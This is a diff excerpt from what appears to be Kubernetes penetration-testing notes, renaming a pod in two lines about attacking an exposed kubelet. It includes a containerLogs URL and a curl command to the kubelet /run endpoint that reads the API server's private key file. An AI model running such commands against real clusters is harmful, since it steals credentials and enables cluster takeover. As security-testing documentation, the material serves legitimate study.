@@ -39,9 +39,9 @@ so http://knode1:10255/pods can provide us some interesting information. includi
 
 Attacking the main kubelet port we can do a lot more, if it's exposed.
 
-https://knode1:10250/containerLogs/kube-system/kube-apiserver-kubeadmnode1/kube-apiserver/
+https://knode1:10250/containerLogs/kube-system/kube-apiserver-kubeadm1/kube-apiserver/
 
-curl -k -XPOST "https://192.168.200.10:10250/run/kube-system/kube-apiserver-kubeadmnode1/kube-apiserver" -d "cmd=cat /etc/kubernetes/pki/apiserver.key"
+curl -k -XPOST "https://192.168.200.10:10250/run/kube-system/kube-apiserver-kubeadm1/kube-apiserver" -d "cmd=cat /etc/kubernetes/pki/apiserver.key"
 
 # Using Service Tokens
 
